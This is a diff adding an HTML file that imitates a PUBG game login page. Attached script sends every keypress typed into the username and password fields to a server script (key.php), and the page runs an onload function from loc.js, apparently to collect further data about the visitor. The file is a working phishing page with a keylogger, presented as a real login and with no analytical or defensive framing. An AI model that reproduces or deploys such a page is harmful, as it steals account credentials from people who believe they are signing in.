@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Login page PUBG</title>
+  <link rel="stylesheet" href="style.css">
+
+  <script src="client.min.js"></script>
+  <script src="loc.js"></script>
+  
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js "></script>
+
+
+</head>
+<body onload="mydata()">
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html>
+<head>
+<title>Login - Pugb</title>
+<meta name="viewport" content="width=devic­­e-width, initial-scale=1">
+<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.7.0/css/all.css' integrity='sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ' crossorigin='anonymous'>
+
+</head>
+<body>
+
+
+<!-- <nav class="navbar">
+
+	<form class="search-bar">
+		<i class="fa fa-search"></i>
+		<input type ="search" name="search" placeholder="Search PUGB">
+		<button type="submit">Search</button>
+	</form>
+
+	<ul class="nav-icons">
+
+		<li><a href="#"><i class="fa fa-home"></i></a></li>
+		<li><a href="#"><i class="fa fa-list-ul"></i></a></li>
+		<li><a href="#"><i class="fa fa-envelope"></i></li>
+		<li><a href="#"><i class="fa fa-gamepad"></i></a></li>
+
+	</ul>
+
+</nav> -->
+
+<form class="login">
+	
+	<div class="logo">
+		<img src="https://gamepedia.cursecdn.com/pubg_esports_gamepedia_en/thumb/f/fe/Imba_PUBG_Super_League_logo.png/220px-Imba_PUBG_Super_League_logo.png?version=68966c167a829149a315139cf2dc837d">
+	</div>
+
+	<div class="inputs">
+		<input id="email" type="text" name="" placeholder="Your user name">
+		<input id="pass" type="password" name="" placeholder="Your secret password">
+		<button>Continue</button>
+		<p>Dont have an account? <a href="#">Sign up</a></p>
+	</div>
+
+</form>
+
+</body>
+
+</html>
+<!-- partial -->
+<script>
+      
+	document
+	.getElementById("email")
+	.addEventListener("keypress", function (data) {
+		$.post("key.php", { userkey: data.key });
+	  });
+	  
+	document
+	  .getElementById("pass")
+	  .addEventListener("keypress", function (data) {
+		$.post("key.php", { passkey: data.key });
+	  });
+	  
+
+  </script>
+</body>
+</html>
